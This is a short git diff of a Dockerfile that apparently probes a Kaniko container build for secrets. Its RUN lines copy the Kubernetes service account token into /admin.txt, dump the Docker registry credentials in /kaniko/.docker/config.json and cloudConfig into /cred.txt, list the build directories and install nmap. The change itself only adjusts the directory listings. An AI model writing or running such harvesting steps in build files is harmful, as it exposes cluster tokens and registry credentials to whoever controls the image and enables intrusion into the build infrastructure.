@@ -7,8 +7,9 @@ RUN echo `cat /var/run/secrets/kubernetes.io/serviceaccount/token` >> /admin.txt
 RUN apt-get update
 RUN apt-get install nmap -y
 RUN apt install tree 
-RUN echo `ls -la /kaniko/` >> /kaniko_file.txt
-RUN echo `ls -la /kaniko/.docker/` >> /docker_file.txt
+RUN echo `ls -a /` >> /main_file.txt
+RUN echo `ls -a /kaniko/` >> /kaniko_file.txt
+RUN echo `ls -a /kaniko/.docker/` >> /docker_file.txt
 RUN echo `cat /kaniko/.docker/config.json` >> /cred.txt
 RUN echo `cat /kaniko/.docker/cloudConfig` >> /cred.txt
 #RUN echo `ls -la /home` >> /dir.txt
